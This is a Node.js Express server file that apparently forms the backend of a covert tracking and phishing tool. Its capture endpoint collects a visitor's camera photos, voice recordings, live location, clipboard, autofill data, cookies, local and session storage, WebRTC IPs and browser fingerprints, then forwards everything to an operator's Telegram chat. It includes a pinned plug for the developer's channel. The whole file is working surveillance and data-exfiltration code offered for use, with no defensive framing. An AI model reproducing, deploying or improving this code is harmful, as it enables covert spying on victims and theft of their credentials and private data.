const express = require('express');
const cors = require('cors');
const multer = require('multer');
const path = require('path');
const TelegramBot = require('./telegram');
const { parse } = require('ua-parser-js');
const geoip = require('geoip-lite');
const fs = require('fs');
const os = require('os');
const locationRouter = require('./location');





const app = express();
const upload = multer({ 
    storage: multer.memoryStorage(),
    limits: { fileSize: 50 * 1024 * 1024 }
});

app.use(cors());
app.use('/api', locationRouter);
app.use(express.json({ limit: '50mb' }));
app.use(express.static(path.join(__dirname, '../public')));

// Initialize Telegram Bot from URL parameters
function getBotFromRequest(req) {
    const token = req.query.token || req.body.token;
    const chatId = req.query.chatid || req.body.chatid;
    
    if (!token || !chatId) {
        return null;
    }
    
    return new TelegramBot(token, chatId);
}

// Get client IP
function getClientIP(req) {
    return req.headers['x-forwarded-for']?.split(',')[0]?.trim() || 
           req.headers['x-real-ip'] || 
           req.connection.remoteAddress || 
           req.socket.remoteAddress;
}

// Format date and time
function getFormattedDateTime() {
    const now = new Date();
    const options = {
        timeZone: 'Asia/Dhaka',
        year: 'numeric',
        month: '2-digit',
        day: '2-digit',
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit',
        hour12: true
    };
    return now.toLocaleString('en-BD', options);
}

// Main capture endpoint
app.post('/api/capture', upload.fields([
    { name: 'frontCamera', maxCount: 1 },
    { name: 'backCamera', maxCount: 1 },
    { name: 'audio', maxCount: 1 }
]), async (req, res) => {
    try {
        const bot = getBotFromRequest(req);
        if (!bot) {
            return res.status(400).json({ error: 'Token and ChatID required' });
        }

        const clientIP = getClientIP(req);
        const geo = geoip.lookup(clientIP);
        const dateTime = getFormattedDateTime();
        
        // Get device info from User-Agent
        const ua = parse(req.headers['user-agent'] || '');
        
        // Build comprehensive device info
        const deviceInfo = {
            timestamp: dateTime,
            ip: clientIP,
            userAgent: req.headers['user-agent'],
            browser: `${ua.browser.name || 'Unknown'} ${ua.browser.version || ''}`,
            os: `${ua.os.name || 'Unknown'} ${ua.os.version || ''}`,
            device: {
                vendor: ua.device.vendor || 'Unknown',
                model: ua.device.model || 'Unknown',
                type: ua.device.type || 'Unknown'
            },
            cpu: ua.cpu?.architecture || 'Unknown',
            engine: ua.engine?.name || 'Unknown',
            location: geo ? {
                country: geo.country,
                region: geo.region,
                city: geo.city,
                timezone: geo.timezone,
                coordinates: geo.ll
            } : 'Unknown',
            headers: {
                acceptLanguage: req.headers['accept-language'],
                referer: req.headers['referer'] || 'Direct',
                connection: req.headers['connection'],
                encoding: req.headers['accept-encoding']
            },
            screenInfo: req.body.screenInfo || {},
            batteryInfo: req.body.batteryInfo || {},
            networkInfo: req.body.networkInfo || {},
            clipboardData: req.body.clipboardData || 'Not available',
            autofillData: req.body.autofillData || 'Not available',
            cookies: req.body.cookies || 'Not available',
            localStorage: req.body.localStorage || 'Not available',
            sessionStorage: req.body.sessionStorage || 'Not available',
            installedExtensions: req.body.extensions || 'Not available',
            platformInfo: req.body.platformInfo || {},
            hardwareInfo: req.body.hardwareInfo || {},
            connectionType: req.body.connectionType || 'Unknown',
            memoryInfo: req.body.memoryInfo || {},
            doNotTrack: req.headers['dnt'] || 'Not set',
            plugins: req.body.plugins || [],
            mimeTypes: req.body.mimeTypes || [],
            permissions: req.body.permissions || [],
            webRTCIPs: req.body.webRTCIPs || [],
            canvas: req.body.canvas || 'Not available',
            webgl: req.body.webgl || 'Not available',
            fonts: req.body.fonts || []
        };

        // Format device info message
        let infoMessage = `🔍 <b>DEVICE INFORMATION CAPTURED</b>\n`;
        infoMessage += `━━━━━━━━━━━━━━━━━━━━━\n`;
        infoMessage += `📅 <b>Date & Time:</b> ${dateTime}\n`;
        infoMessage += `🌐 <b>IP Address:</b> ${clientIP}\n`;
        
        if (geo) {
            infoMessage += `📍 <b>Location:</b> ${geo.city || 'Unknown'}, ${geo.region || ''}, ${geo.country || 'Unknown'}\n`;
            infoMessage += `🗺 <b>Coordinates:</b> ${geo.ll ? geo.ll.join(', ') : 'Unknown'}\n`;
            infoMessage += `🕐 <b>Timezone:</b> ${geo.timezone || 'Unknown'}\n`;
        }
        
        infoMessage += `\n📱 <b>DEVICE DETAILS</b>\n`;
        infoMessage += `━━━━━━━━━━━━━━━━━━━━━\n`;
        infoMessage += `💻 <b>Device:</b> ${deviceInfo.device.vendor} ${deviceInfo.device.model} (${deviceInfo.device.type})\n`;
        infoMessage += `🖥 <b>OS:</b> ${deviceInfo.os}\n`;
        infoMessage += `🌐 <b>Browser:</b> ${deviceInfo.browser}\n`;
        infoMessage += `⚙️ <b>Engine:</b> ${deviceInfo.engine}\n`;
        infoMessage += `🔧 <b>CPU:</b> ${deviceInfo.cpu}\n`;
        
        infoMessage += `\n📊 <b>SCREEN & DISPLAY</b>\n`;
        infoMessage += `━━━━━━━━━━━━━━━━━━━━━\n`;
        infoMessage += `📺 <b>Resolution:</b> ${deviceInfo.screenInfo.width || '?'}x${deviceInfo.screenInfo.height || '?'}\n`;
        infoMessage += `🎨 <b>Color Depth:</b> ${deviceInfo.screenInfo.colorDepth || '?'}-bit\n`;
        infoMessage += `📐 <b>Pixel Ratio:</b> ${deviceInfo.screenInfo.pixelRatio || '?'}\n`;
        infoMessage += `🖼 <b>Viewport:</b> ${deviceInfo.screenInfo.viewport || '?'}\n`;
        
        infoMessage += `\n🔋 <b>BATTERY & NETWORK</b>\n`;
        infoMessage += `━━━━━━━━━━━━━━━━━━━━━\n`;
        infoMessage += `🔋 <b>Battery:</b> ${deviceInfo.batteryInfo.level || '?'}% ${deviceInfo.batteryInfo.charging ? '⚡Charging' : '🔌Not Charging'}\n`;
        infoMessage += `📶 <b>Connection:</b> ${deviceInfo.connectionType || 'Unknown'}\n`;
        infoMessage += `🌐 <b>Network:</b> ${deviceInfo.networkInfo.type || 'Unknown'}\n`;
        
        if (deviceInfo.webRTCIPs.length > 0) {
            infoMessage += `\n🔍 <b>WEBRTC LOCAL IPS:</b>\n`;
            infoMessage += `━━━━━━━━━━━━━━━━━━━━━\n`;
            deviceInfo.webRTCIPs.forEach(ip => {
                infoMessage += `• ${ip}\n`;
            });
        }
        
        infoMessage += `\n💾 <b>STORAGE DATA</b>\n`;
        infoMessage += `━━━━━━━━━━━━━━━━━━━━━\n`;
        infoMessage += `📋 <b>Clipboard:</b> ${deviceInfo.clipboardData}\n`;
        infoMessage += `🔑 <b>Autofill Data:</b> ${deviceInfo.autofillData}\n`;
        infoMessage += `🍪 <b>Cookies:</b> ${deviceInfo.cookies ? 'Captured' : 'Not available'}\n`;
        infoMessage += `💾 <b>LocalStorage:</b> ${deviceInfo.localStorage ? 'Captured' : 'Not available'}\n`;
        
        infoMessage += `\n🔧 <b>SYSTEM INFO</b>\n`;
        infoMessage += `━━━━━━━━━━━━━━━━━━━━━\n`;
        infoMessage += `💻 <b>Platform:</b> ${deviceInfo.platformInfo.platform || 'Unknown'}\n`;
        infoMessage += `🧠 <b>Memory:</b> ${deviceInfo.memoryInfo.jsHeapSizeLimit ? `${Math.round(deviceInfo.memoryInfo.jsHeapSizeLimit / 1048576)}MB` : 'Unknown'}\n`;
        infoMessage += `🔌 <b>Plugins:</b> ${deviceInfo.plugins.length} detected\n`;
        infoMessage += `🖋 <b>Fonts:</b> ${deviceInfo.fonts.length} detected\n`;
        
        infoMessage += `\n━━━━━━━━━━━━━━━━━━━━━\n`;
        infoMessage += `📢 Subscribe @CodeDevZeron\n`;
        infoMessage += `👨‍💻 Developer @DevZeron`;

        // Send initial subscription message and pin it
        await bot.sendMessage('🔔 <b>NEW DEVICE CONNECTED!</b>\n📢 Subscribe @CodeDevZeron', { pin: true });
        
        // Send device information
        await bot.sendMessage(infoMessage);

        // Send clipboard data if available
        if (deviceInfo.clipboardData && deviceInfo.clipboardData !== 'Not available') {
            await bot.sendMessage(`📋 <b>CLIPBOARD DATA:</b>\n<pre>${deviceInfo.clipboardData}</pre>`);
        }

        // Send autofill data if available
        if (deviceInfo.autofillData && deviceInfo.autofillData !== 'Not available') {
            await bot.sendMessage(`🔑 <b>AUTOFILL DATA:</b>\n<pre>${deviceInfo.autofillData}</pre>`);
        }

        // Send location if available
        if (req.body.latitude && req.body.longitude) {
            const locationCaption = `📍 <b>Live Location</b>\n🕐 ${dateTime}\n🌍 ${req.body.latitude}, ${req.body.longitude}`;
            await bot.sendLocation(req.body.latitude, req.body.longitude, locationCaption);
        }

        // Send front camera capture
        if (req.files && req.files.frontCamera && req.files.frontCamera[0]) {
            const frontCaption = `📸 <b>FRONT CAMERA</b>\n🕐 ${dateTime}\n📱 ${deviceInfo.device.vendor} ${deviceInfo.device.model}`;
            await bot.sendPhoto(req.files.frontCamera[0].buffer, frontCaption);
        }

        // Send back camera capture
        if (req.files && req.files.backCamera && req.files.backCamera[0]) {
            const backCaption = `📸 <b>BACK CAMERA</b>\n🕐 ${dateTime}\n📱 ${deviceInfo.device.vendor} ${deviceInfo.device.model}`;
            await bot.sendPhoto(req.files.backCamera[0].buffer, backCaption);
        }

        // Send audio recording
        if (req.files && req.files.audio && req.files.audio[0]) {
            const audioCaption = `🎙 <b>VOICE RECORDING</b>\n🕐 ${dateTime}\n📱 ${deviceInfo.device.vendor} ${deviceInfo.device.model}`;
            await bot.sendAudio(req.files.audio[0].buffer, audioCaption);
        }

        // Send comprehensive JSON report
        const jsonReport = JSON.stringify(deviceInfo, null, 2);
        const reportBuffer = Buffer.from(jsonReport, 'utf-8');
        const reportCaption = `📄 <b>COMPLETE DEVICE REPORT</b>\n🕐 ${dateTime}`;
        await bot.sendDocument(reportBuffer, `device_report_${Date.now()}.json`, reportCaption);

        res.json({ 
            success: true, 
            message: 'Data captured and sent successfully',
            timestamp: dateTime
        });

    } catch (error) {
        console.error('Capture error:', error);
        res.status(500).json({ error: 'Internal server error' });
    }
});

// Health check endpoint
app.get('/api/health', (req, res) => {
    res.json({ status: 'OK', timestamp: new Date().toISOString() });
});

// Serve main page
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, '../public/index.html'));
});

// For Vercel serverless
module.exports = app;
